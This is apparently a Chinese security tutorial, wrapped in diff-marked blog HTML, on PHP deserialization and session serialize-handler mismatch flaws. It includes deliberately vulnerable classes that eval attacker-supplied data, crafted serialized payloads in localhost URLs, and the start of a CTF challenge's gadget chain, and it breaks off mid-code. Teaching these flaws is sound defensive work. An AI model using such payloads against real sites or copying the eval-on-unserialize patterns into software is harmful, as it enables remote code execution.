class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc07585724212-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__wakeup</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-k ">eval</span><span class="crayon-sy">(</span><span class="crayon-v">$this</span><span class="crayon-o">-&gt;</span><span class="crayon-i">func</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc07585724212-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-10"><span class="crayon-sy">}</span></div><div class="crayon-line" id="crayon-58150e20dfc07585724212-11"><span class="crayon-e">unserialize</span><span class="crayon-sy">(</span><span class="crayon-v">$_GET</span><span class="crayon-sy">[</span><span class="crayon-s">'a'</span><span class="crayon-sy">]</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc07585724212-12"><span class="crayon-ta">?&gt;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0018 seconds] -->
+    <p>在11行对传入的参数进行了序列化。我们可以通过传入一个特定的字符串，反序列化为syclover的一个示例，那么就可以执行eval()方法。我们访问<code>localhost/test.php?a=O:8:"syclover":1:{s:4:"func";s:14:"echo "spoock";";}</code>。那么反序列化得到的内容是:</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc0a429509151" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+object(syclover)[1]
+  public 'func' =&gt; string 'echo "spoock";' (length=14)</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc0a429509151-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc0a429509151-2">2</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc0a429509151-1"><span class="crayon-t">object</span><span class="crayon-sy">(</span><span class="crayon-v">syclover</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc0a429509151-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-s">'func'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-s">'echo "spoock";'</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">length</span><span class="crayon-o">=</span><span class="crayon-cn">14</span><span class="crayon-sy">)</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0007 seconds] -->
+    <p>最后页面输出的就是spoock，说明最后执行了我们定义的<code>echo "spoock";</code>方法。<br />
+        这就是一个简单的序列化的漏洞的演示</p>
+    <h3 id="PHP-Session中的序列化危害">PHP Session中的序列化危害</h3>
+    <p>PHP中的Session的实现是没有的问题，危害主要是由于程序员的Session使用不当而引起的。<br />
+        如果在PHP在反序列化存储的$_SESSION数据时使用的引擎和序列化使用的引擎不一样，会导致数据无法正确第反序列化。通过精心构造的数据包，就可以绕过程序的验证或者是执行一些系统的方法。例如:</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc0d028219024" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+$_SESSION['ryat'] = '|O:11:"PeopleClass":0:{}';</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc0d028219024-1">1</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc0d028219024-1"><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">'ryat'</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'|O:11:"PeopleClass":0:{}'</span><span class="crayon-sy">;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0004 seconds] -->
+    <p>上述的$_SESSION的数据使用<code>php_serialize</code>，那么最后的存储的内容就是<code>a:1:{s:6:"spoock";s:24:"|O:11:"PeopleClass":0:{}";}</code>。<br />
+        但是我们在进行读取的时候，选择的是<code>php</code>，那么最后读取的内容是:</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc10133213890" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+array (size=1)
+  'a:1:{s:6:"spoock";s:24:"' =&gt;
+    object(__PHP_Incomplete_Class)[1]
+      public '__PHP_Incomplete_Class_Name' =&gt; string 'PeopleClass' (length=11)</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc10133213890-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc10133213890-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc10133213890-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc10133213890-4">4</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc10133213890-1"><span class="crayon-t">array</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">size</span><span class="crayon-o">=</span><span class="crayon-cn">1</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc10133213890-2"><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-s">'a:1:{s:6:"spoock";s:24:"'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span></div><div class="crayon-line" id="crayon-58150e20dfc10133213890-3"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">object</span><span class="crayon-sy">(</span><span class="crayon-v">__PHP_Incomplete_Class</span><span class="crayon-sy">)</span><span class="crayon-sy">[</span><span class="crayon-cn">1</span><span class="crayon-sy">]</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc10133213890-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-m">public</span><span class="crayon-h"> </span><span class="crayon-s">'__PHP_Incomplete_Class_Name'</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-o">&gt;</span><span class="crayon-h"> </span><span class="crayon-t">string</span><span class="crayon-h"> </span><span class="crayon-s">'PeopleClass'</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-v">length</span><span class="crayon-o">=</span><span class="crayon-cn">11</span><span class="crayon-sy">)</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0009 seconds] -->
+    <p>这是因为当使用php引擎的时候，php引擎会以<strong>|</strong>作为作为key和value的分隔符，那么就会将<code>a:1:{s:6:"spoock";s:24:"</code>作为SESSION的key，将<code>O:11:"PeopleClass":0:{}</code>作为value，然后进行反序列化，最后就会得到PeopleClas这个类。<br />
+        这种由于序列话化和反序列化所使用的不一样的引擎就是造成PHP Session序列话漏洞的原因。</p>
+    <h3 id="实际利用">实际利用</h3>
+    <p>存在s1.php和us2.php，2个文件所使用的SESSION的引擎不一样，就形成了一个漏洞、<br />
+        s1.php，使用php_serialize来处理session</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc13951462586" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+ini_set('session.serialize_handler', 'php_serialize');
+session_start();
+$_SESSION["spoock"]=$_GET["a"];</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc13951462586-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc13951462586-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc13951462586-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc13951462586-4">4</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc13951462586-1"><span class="crayon-o">&lt;</span><span class="crayon-sy">?</span><span class="crayon-e">php</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc13951462586-2"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php_serialize'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc13951462586-3"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc13951462586-4"><span class="crayon-sy">$</span><span class="crayon-v">_SESSION</span><span class="crayon-sy">[</span><span class="crayon-s">"spoock"</span><span class="crayon-sy">]</span><span class="crayon-o">=</span><span class="crayon-sy">$</span><span class="crayon-v">_GET</span><span class="crayon-sy">[</span><span class="crayon-s">"a"</span><span class="crayon-sy">]</span><span class="crayon-sy">;</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0007 seconds] -->
+    <p>us2.php,使用php来处理session</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc16828607770" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+ini_set('session.serialize_handler', 'php');
+session_start();
+class lemon {
+    var $hi;
+    function __construct(){
+        $this-&gt;hi = 'phpinfo();';
+    }
+
+    function __destruct() {
+         eval($this-&gt;hi);
+    }
+}</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-2">2</div><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-4">4</div><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-6">6</div><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-7">7</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-8">8</div><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-9">9</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-10">10</div><div class="crayon-num" data-line="crayon-58150e20dfc16828607770-11">11</div><div class="crayon-num crayon-striped-num" data-line="crayon-58150e20dfc16828607770-12">12</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc16828607770-1"><span class="crayon-e">ini_set</span><span class="crayon-sy">(</span><span class="crayon-s">'session.serialize_handler'</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-s">'php'</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-2"><span class="crayon-e">session_start</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc16828607770-3"><span class="crayon-t">class</span><span class="crayon-h"> </span><span class="crayon-e">lemon</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-4"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">var</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">hi</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc16828607770-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__construct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-6"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">$</span><span class="crayon-r">this</span><span class="crayon-o">-&gt;</span><span class="crayon-v">hi</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-s">'phpinfo();'</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc16828607770-7"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-8"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span></div><div class="crayon-line" id="crayon-58150e20dfc16828607770-9"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-t">function</span><span class="crayon-h"> </span><span class="crayon-e">__destruct</span><span class="crayon-sy">(</span><span class="crayon-sy">)</span><span class="crayon-h"> </span><span class="crayon-sy">{</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-10"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span><span class="crayon-e">eval</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-r">this</span><span class="crayon-o">-&gt;</span><span class="crayon-v">hi</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span></div><div class="crayon-line" id="crayon-58150e20dfc16828607770-11"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-58150e20dfc16828607770-12"><span class="crayon-sy">}</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0014 seconds] -->
+    <p>当访问s1.php时，提交如下的数据：</p>
+    <p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc19799531047" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+localhost/s1.php?a=|O:5:"lemon":1:{s:2:"hi";s:14:"echo "spoock";";}</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
+                        <div class="crayon-nums-content" style="font-size: 13px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-58150e20dfc19799531047-1">1</div></div>
+                    </td>
+                    <td class="crayon-code"><div class="crayon-pre" style="font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-58150e20dfc19799531047-1"><span class="crayon-v">localhost</span><span class="crayon-o">/</span><span class="crayon-v">s1</span><span class="crayon-sy">.</span><span class="crayon-v">php</span><span class="crayon-sy">?</span><span class="crayon-v">a</span><span class="crayon-o">=</span><span class="crayon-o">|</span><span class="crayon-v">O</span><span class="crayon-o">:</span><span class="crayon-cn">5</span><span class="crayon-o">:</span><span class="crayon-s">"lemon"</span><span class="crayon-o">:</span><span class="crayon-cn">1</span><span class="crayon-o">:</span><span class="crayon-sy">{</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">2</span><span class="crayon-o">:</span><span class="crayon-s">"hi"</span><span class="crayon-sy">;</span><span class="crayon-v">s</span><span class="crayon-o">:</span><span class="crayon-cn">14</span><span class="crayon-o">:</span><span class="crayon-s">"echo "</span><span class="crayon-i">spoock</span><span class="crayon-s">";"</span><span class="crayon-sy">;</span><span class="crayon-sy">}</span></div></div></td>
+                </tr>
+            </table>
+        </div>
+    </div>
+    <!-- [Format Time: 0.0009 seconds] -->
+    <p>此时传入的数据会按照<strong>php_serialize</strong>来进行序列化。<br />
+        此时访问us2.php时，页面输出，<code>spoock</code>成功执行了我们构造的函数。因为在访问us2.php时，程序会按照<strong>php</strong>来反序列化SESSION中的数据，此时就会反序列化伪造的数据，就会实例化lemon对象，最后就会执行析构函数中的eval()方法。</p>
+    <h3 id="CTF">CTF</h3>
+    <p>在安恒杯中的一道题目就考察了这个知识点。题目中的关键代码如下：<br />
+        class.php</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->
+
+    <div id="crayon-58150e20dfc1c816433959" class="crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-always" style=" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;">
+
+        <div class="crayon-toolbar" data-settings=" show" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-title"></span>
+            <div class="crayon-tools" style="font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;"><span class="crayon-mixed-highlight" title="含多种语言"></span><div class="crayon-button crayon-nums-button" title="切换是否显示行编号"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="纯文本显示代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="切换自动换行"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="点击展开代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="复制代码"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="在新窗口中显示代码"><div class="crayon-button-icon"></div></div></div></div>
+        <div class="crayon-info" style="min-height: 18.2px !important; line-height: 18.2px !important;"></div>
+        <div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;">
+&lt;?php
+
+highlight_string(file_get_contents(basename($_SERVER['PHP_SELF'])));
+//show_source(__FILE__);
+
+class foo1{
+        public $varr;
+        function __construct(){
+                $this-&gt;varr = "index.php";
+        }
+        function __destruct(){
+                if(file_exists($this-&gt;varr)){
+                        echo "&lt;br&gt;文件".$this-&gt;varr."存在&lt;br&gt;";
+                }
+                echo "&lt;br&gt;这是foo1的析构函数&lt;br&gt;";
+        }
+}
+
+class foo2{
+        public $varr;
+        public $obj;
+        function __construct(){
+                $this-&gt;varr = '1234567890';
+                $this-&gt;obj = null;
+        }
+        function __toString(){
+                $this-&gt;obj-&gt;execute();
+                return $this-&gt;varr;
+        }
+        function __desctuct(){
+                echo "&lt;br&gt;这是foo2的析构函数&lt;br&gt;";
+        }
+}
+
+class foo3{
+        public $varr;
+        function execute(){
+                eval($this-&gt;varr);
+        }
+        function __desctuct(){
+                echo "&lt;br&gt;这是foo3的析构函数&lt;br&gt;";
+        }
+}
+
+?&gt;</textarea></div>
+        <div class="crayon-main" style="">
+            <table class="crayon-table">
+                <tr class="crayon-row">
+                    <td class="crayon-nums " data-settings="show">
